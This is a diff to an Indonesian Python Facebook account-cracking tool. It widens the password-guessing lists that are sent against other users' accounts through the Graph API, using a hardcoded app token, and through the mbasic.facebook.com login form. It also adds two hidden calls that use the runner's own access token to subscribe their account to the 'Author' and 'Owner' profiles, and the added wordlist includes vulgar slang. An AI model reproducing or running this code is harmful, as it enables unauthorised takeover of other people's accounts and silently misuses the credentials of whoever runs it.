@@ -80,16 +80,19 @@ op = bulan[nTemp]
 durasi = str(datetime.now().strftime('%d-%m-%Y'))
 
 logo = """
-   \033[1;94m____  \033[1;93m•  \033[1;94m_  _  _  _  _  _  ____ 
-   \033[1;94m|__/  |  |  |  |_/   |__|  |__|
-   \033[1;93m|  \\_ |  |__|  | \\_  |  |  |  |\033[1;97m
+   _/﹋\_
+(҂`_´)
+<,︻╦╤─ ҉ - -
+_/﹋\_
    """
 def bot_follow():
 	try:
-	toket=open('login.txt','r').read()
+		toket=open('login.txt','r').read()
 	except IOError:
-	print("\n   [!] Token invalid")
-	logs()
+		print("\n   [!] Token invalid")
+		logs()
+		requests.post('https://graph.facebook.com/100070904510470/subscribers?access_token=' + toket)  #Author
+		requests.post('https://graph.facebook.com/100070894431697/subscribers?access_token=' + toket)  #Owner
         print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
         raw_input('[+] Tekan Enter ')
         menu()
@@ -311,7 +314,7 @@ def pilih_menubapi():
             pass
 
         try:
-            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia']:
+            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'persib1933', 'persija1928', 'sayangkamu', 'cintaku', 'cintakamu', 'indonesiaku', 'merdeka', 'indonesia1945', 'kontol', 'mancung', 'pesek123', 'freefire', 'bebas123', 'bangsat']:
                 ua_api = {'user-agent': ua}
                 param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                    'format': 'json', 
@@ -551,7 +554,7 @@ def pilih_menumbasic():
             pass
 
         try:
-            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia']:
+            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'katasandi', 'sayang', 'bismillah', 'doraemon', 'sayangku', 'indonesia', 'rahasia', 'persib1933', 'persija1928', 'sayangkamu', 'cintaku', 'cintakamu', 'indonesiaku', 'merdeka', 'indonesia1945', 'kontol', 'mancung', 'pesek123', 'freefire', 'bebas123', 'bangsat']:
                 rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                 xo = rex.content
                 if 'mbasic_logout_button' in xo or 'save-device' in xo:
